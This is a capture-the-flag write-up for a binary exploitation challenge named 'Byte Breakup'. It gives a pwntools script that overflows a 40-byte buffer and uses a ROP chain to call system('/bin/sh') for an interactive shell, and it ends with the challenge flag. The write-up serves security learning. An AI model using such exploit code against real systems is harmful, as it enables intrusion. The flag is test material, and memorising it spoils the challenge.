# Byte Breakup 
Solved by **CapangJabba**

## Question
Welcome to 'Byte Breakup,' where an old program is stuck in a code-cial relationship with a bug—the ex-girlfriend kind! She left a glitchy surprise, and now it's up to you to debug the drama away. Can you charm your way through its defenses and make it sing? Get ready for a byte-sized comedy of errors as you unravel the mysteries left by your digital ex!

## Solution
`xplt.py`

```
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./vuln_patched", )
elf = context.binary = ELF("./vuln_patched", checksec=False)
context.log_level = 'debug'
libc = ELF('./libc.so.6')

offset = 40
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh\x00')))
ret = 0x0000000000401020
pop_rdi = 0x00000000004012bb
plt_system = elf.plt['system']
payload = b'A'*offset 
payload += p64(ret)
payload += rop.chain()
pause()
io.recvuntil(b'password: \n')
io.sendline(payload)
io.recvuntil(b'Wrong password\n')
io.interactive()
```

### Flag
`OSCTF{b1t_byt3_8r3akup}
